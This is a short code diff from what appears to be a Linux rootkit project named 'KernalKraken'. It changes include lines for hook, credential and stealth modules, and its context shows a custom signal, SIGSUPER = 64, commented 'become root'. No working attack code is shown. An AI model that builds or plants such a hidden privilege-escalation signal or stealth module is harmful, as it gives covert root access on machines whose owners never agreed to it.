@@ -1,8 +1,7 @@
-#include<headers/hooks.h>
-#include<headers/KernalKraken.h>
-
-#include<src/credentials.c>
-#include<src/stealth.c>
+#include "../headers/hooks.h"
+#include "../headers/KernalKraken.h"
+#include "../headers/credentials.h"
+#include "../headers/stealth.h"
 
 enum signals{
     SIGSUPER = 64, // become root
